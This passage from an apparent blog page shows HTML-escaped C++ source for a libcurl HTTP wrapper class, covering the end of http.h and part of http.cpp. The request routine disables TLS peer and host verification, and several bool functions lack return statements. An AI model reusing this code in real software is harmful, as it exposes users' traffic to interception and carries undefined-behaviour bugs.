    &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getResponse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;private&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_responseCode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_timeout&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;short&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_connectTimeout&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;CURL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;curl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;CURLcode&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_title&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_responseHeader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_responseBody&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;isRequested&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;curl_slist&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_requestHeaders&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;curl_slist&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_responseCookie&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_callBackWrite&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

&lt;span class=&quot;cp&quot;&gt;#endif //MYPROJECT_HTTP_H
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;http.cpp&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;//&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// Created by payloads on 1/22/18.&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;//&lt;/span&gt;

&lt;span class=&quot;cp&quot;&gt;#include &quot;http.h&quot;
&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt;/**
 * 初始化请求对象
 */&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;curl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;isRequested&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;curl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;curl_easy_init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;cm&quot;&gt;/**
 * 回收资源
 */&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::~&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;curl_slist_free_all&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_requestHeaders&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;curl_slist_free_all&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_responseCookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;curl_easy_cleanup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;curl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;cm&quot;&gt;/**
 * 设置请求地址和端口
 * @param url
 * @param port
 */&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;curl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;curl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;curl_easy_init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;_url&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;substr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;https&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;443&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;curl_easy_setopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;curl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CURLOPT_URL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c_str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;curl_easy_setopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;curl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CURLOPT_PORT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;cm&quot;&gt;/**
 * 设置请求地址
 * @param url
 * @return
 */&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setURL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;curl_easy_setopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;curl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CURLOPT_URL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c_str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;cm&quot;&gt;/**
 * 设置端口
 * @param port
 * @return
 */&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setPort&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;curl_easy_setopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;curl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CURLOPT_PORT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;


&lt;span class=&quot;cm&quot;&gt;/**
 * 发送请求
 * @return
 */&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;curl_easy_setopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;curl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CURLOPT_TIMEOUT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_timeout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;curl_easy_setopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;curl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CURLOPT_CONNECTTIMEOUT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_connectTimeout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;curl_easy_setopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;curl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CURLOPT_SSL_VERIFYPEER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;curl_easy_setopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;curl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CURLOPT_SSL_VERIFYHOST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;curl_easy_setopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;curl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CURLOPT_WRITEFUNCTION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_callBackWrite&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;curl_easy_setopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;curl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CURLOPT_WRITEHEADER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_responseHeader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;curl_easy_setopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;curl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CURLOPT_WRITEDATA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_responseBody&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_requestHeaders&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;curl_easy_setopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;curl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CURLOPT_HTTPHEADER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_requestHeaders&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;curl_easy_setopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;curl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CURLOPT_FORBID_REUSE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;_res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;curl_easy_perform&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;curl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;curl_easy_getinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;curl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CURLINFO_RESPONSE_CODE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_responseCode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;isRequested&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;cm&quot;&gt;/**
 * 回调函数
 * @param ptr
 * @param n
 * @param m
 * @param data
 * @return
 */&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_callBackWrite&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;cm&quot;&gt;/**
 * get请求
 * @return
 */&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;_request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;cm&quot;&gt;/**
 * post请求
 * @param data
 * @return
 */&lt;/span&gt;
